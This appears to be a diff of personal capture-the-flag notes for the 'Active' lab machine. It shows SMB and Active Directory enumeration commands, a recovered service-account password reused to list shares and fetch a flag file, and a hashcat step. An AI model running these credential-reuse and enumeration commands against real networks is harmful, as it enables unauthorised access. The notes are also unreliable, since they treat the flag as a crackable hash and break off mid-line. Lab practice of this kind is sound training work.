@@ -81,4 +81,19 @@ smbclient \\\\Active\\Replication
   
   **Creds::**
   active.htb/svc_tgs:GPPstillStandingStrong2k18
+  
+  enum4linux <ip> # gives smb share login access.
+  smbmap -H <ip> # lists shares 
+        smbmap -R <share name> -H <ip> -A <file> -q #quiet
+   
+  GetADUsers.py -all active.htb/svc_tgs -dc-ip <ip>
+  
+ Try smbmap again::
+        smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H <ip>
+        :: Now READ ONLY access to NETLOGON,Replication,SYSVOL,Users
+         smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H <ip> -R Users #recursively list files in Users smb share 
+ smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q
+        cat user.txt :: 86d67d8ba232bb6a254aa4d10159e983 >hashsmb.txt
+        hashcat hashsmb.txt /usr/share/wordlist/rockyou.txt
 
+        hash
